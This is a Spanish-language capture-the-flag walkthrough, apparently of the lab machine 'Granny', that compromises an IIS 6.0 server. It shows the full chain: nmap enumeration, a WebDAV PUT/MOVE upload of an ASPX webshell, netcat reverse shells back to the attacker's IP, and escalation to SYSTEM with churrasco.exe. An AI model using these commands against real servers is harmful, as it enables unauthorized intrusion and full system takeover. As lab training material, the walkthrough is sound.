>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/granny]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.95.234
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-15 08:55 EST
Nmap scan report for 10.129.95.234
Host is up (0.062s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

>Al enviar una **request HTTP** con el método **OPTIONS**, vemos que hay muchos métodos disponibles que son peligrosos como por ejemplo **PUT** y **MOVE**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/granny]
└─$ curl -X OPTIONS http://10.129.95.234 -i
HTTP/1.1 200 OK
Date: Thu, 15 Jan 2026 13:58:53 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
MS-Author-Via: MS-FP/4.0,DAV
Content-Length: 0
Accept-Ranges: none
DASL: <DAV:sql>
DAV: 1, 2
Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Cache-Control: private
```

>Usamos **davtest** para ver que extensiones de archivos se pueden subir por **PUT** y vemos que solo se puede **.html** y **.txt**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/granny]
└─$ davtest -url http://10.129.95.234
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.129.95.234
********************************************************
NOTE	Random string for this session: 50bdRpImSwI
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.129.95.234/DavTestDir_50bdRpImSwI
********************************************************
 Sending test files
PUT	aspx	FAIL
PUT	asp	FAIL
PUT	jhtml	SUCCEED:	http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.jhtml
PUT	jsp	SUCCEED:	http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.jsp
PUT	html	SUCCEED:	http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.html
PUT	cfm	SUCCEED:	http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.cfm
PUT	cgi	FAIL
PUT	txt	SUCCEED:	http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.txt
PUT	pl	SUCCEED:	http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.pl
PUT	php	SUCCEED:	http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.php
PUT	shtml	FAIL
********************************************************
 Checking for test file execution
EXEC	jhtml	FAIL
EXEC	jsp	FAIL
EXEC	html	SUCCEED:	http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.html
EXEC	html	FAIL
EXEC	cfm	FAIL
EXEC	txt	SUCCEED:	http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.txt
EXEC	txt	FAIL
EXEC	pl	FAIL
EXEC	php	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.129.95.234/DavTestDir_50bdRpImSwI
PUT File: http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.jhtml
PUT File: http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.jsp
PUT File: http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.html
PUT File: http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.cfm
PUT File: http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.txt
PUT File: http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.pl
PUT File: http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.php
Executes: http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.html
Executes: http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.txt
```

>Pero como tenemos el método **MOVE** podemos subir una **webshell** en **formato .txt**  con el método **PUT** y **cambiarle el nombre** con **MOVE** a **.aspx** para que pueda ejecutarse al ser un IIS:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/granny]
└─$ cadaver http://10.129.95.234
dav:/> put cmdasp.txt 
Uploading cmdasp.txt to `/cmdasp.txt':
Progress: [=============================>] 100.0% of 1400 bytes succeeded.
dav:/> move cmdasp.txt cmdasp.aspx
Moving `/cmdasp.txt' to `/cmdasp.aspx':  succeeded.
dav:/> exit
Connection to `10.129.95.234' closed.
```

>Accedemos a la webshell via web:

<img width="715" height="82" alt="image" src="https://github.com/user-attachments/assets/bad7600b-9b82-44f8-968e-b72b6fedb963" />

>Subimos **nc.exe** con el **webdav** empleando la misma metodología anteriormente empleada:

```
┌──(kali㉿jbkira)-[~/Desktop/machines/granny]
└─$ cadaver http://10.129.95.234
dav:/> put nc.txt 
Uploading nc.txt to `/nc.txt':
Progress: [=============================>] 100.0% of 28160 bytes succeeded.
dav:/> move nc.txt nc.exe
Moving `/nc.txt' to `/nc.exe':  succeeded.
dav:/> exit
Connection to `10.129.95.234' closed.
```

>Enviamos este payload por la **webshell** y recibimos una **reverse shell**:

```bash
c:\inetpub\wwwroot\nc.exe 10.10.14.71 443 -e cmd.exe
```

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/granny]
└─$ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.95.234] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>
```

>Vemos el token **SeImpersonatePrivilege** en el usuario que estamos empleando y está habilitado así que podemos escalar privilegios con esto:

```bash
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

>Subimos **churrasco.exe** ya que es un Windows Server bastante antiguo y escalamos privilegios con esto para ejecutar una reverse shell como **SYSTEM**:

```powershell
C:\Inetpub\wwwroot>.\churrasco.exe "C:\Inetpub\wwwroot\nc.exe 10.10.14.71 4444 -e cmd.exe"
```

>Recibimos la shell y ya hemos escalado a **SYSTEM**, comprometiendo por completo la máquina:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/granny]
└─$ rlwrap nc -nlvp 4444                 
listening on [any] 4444 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.95.234] 1031
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```
